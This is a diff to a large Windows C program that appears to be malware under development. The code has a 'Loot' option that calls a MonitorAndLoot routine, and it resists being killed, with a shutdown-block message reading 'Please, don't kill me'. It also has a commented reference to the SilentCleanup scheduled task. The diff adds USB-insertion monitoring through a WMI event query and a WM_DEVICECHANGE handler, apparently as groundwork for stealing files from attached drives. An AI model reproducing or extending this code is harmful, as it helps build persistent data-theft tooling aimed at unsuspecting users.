@@ -2725,6 +2725,20 @@ void test155(void) {
 	}
 }
 
+VOID Callback156
+(
+	_In_ BSTR lpInput,
+	_In_ LPVOID Arg
+)
+{
+	MessageBoxW(NULL, lpInput, L"Title", MB_OK);
+}
+
+void test156(void) {
+	RegisterAsyncEvent(L"Select * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
+	Sleep(100000000);
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2894,7 +2908,7 @@ VOID Final(VOID)
 #endif
 
 	if (pGlobalConfig->Loot) {
-		MonitorAndLoot(pGlobalConfig);
+		MonitorUsb(pGlobalConfig);
 	}
 	
 	Sleep(1000000000);
@@ -2942,12 +2956,13 @@ LRESULT WindowProc
 	_In_ LPARAM lParam
 )
 {
-	/*CHAR Message[0x100];
-
-	wsprintfA(Message, "%d\n", uMsg);
-	AppendToFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", Message, lstrlenA(Message));*/
 	if (uMsg == WM_QUERYENDSESSION || uMsg == WM_ENDSESSION || uMsg == WM_DESTROY || uMsg == WM_CLOSE) {
 		ShutdownBlockReasonCreate(hWnd, L"Please, don't kill me");
+	}
+	else if (uMsg == WM_DEVICECHANGE) {
+		if (wParam == DBT_DEVICEARRIVAL) {
+			MessageBoxA(NULL, "DBT_DEVICEARRIVAL", "Title", MB_OK);
+		}
 	}
 	else {
 		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
@@ -3004,34 +3019,34 @@ CLEANUP:
 	return dwRetcode;
 }
 
-int WinMain
-(
-	_In_ HINSTANCE hInstance,
-	_In_opt_ HINSTANCE hPrevInstance,
-	_In_ LPSTR lpCmdLine,
-	_In_ int nShowCmd
-)
-//int main(void)
+//int WinMain
+//(
+//	_In_ HINSTANCE hInstance,
+//	_In_opt_ HINSTANCE hPrevInstance,
+//	_In_ LPSTR lpCmdLine,
+//	_In_ int nShowCmd
+//)
+int main(void)
 {
 	DWORD dwLevel = 0;
 	DWORD dwFlags = 0;
 	HANDLE hThread = NULL;
 
-#ifdef _DEBUG
-	if (!AttachConsole(GetParentProcessId(GetCurrentProcessId()))) {
-		AllocConsole();
-	}
-#endif
-	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
-		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
-			LOG_ERROR("SetProcessShutdownParameters", GetLastError());
-			goto CLEANUP;
-		}
-	}
-	else {
-		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
-		goto CLEANUP;
-	}
+//#ifdef _DEBUG
+//	if (!AttachConsole(GetParentProcessId(GetCurrentProcessId()))) {
+//		AllocConsole();
+//	}
+//#endif
+//	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
+//		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
+//			LOG_ERROR("SetProcessShutdownParameters", GetLastError());
+//			goto CLEANUP;
+//		}
+//	}
+//	else {
+//		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
+//		goto CLEANUP;
+//	}
 
 	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	LoadLibraryW(L"advapi32.dll");
@@ -3053,11 +3068,11 @@ int WinMain
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
 
-	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
+	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
 	if (hThread == NULL) {
 		LOG_ERROR("CreateThread", GetLastError())
 		goto CLEANUP;
-	}
+	}*/
 
 	Sleep(2000);
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
@@ -3212,7 +3227,8 @@ int WinMain
 	//test153();
 	//test154();
 	//test155();
-	Final();
+	test156();
+	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
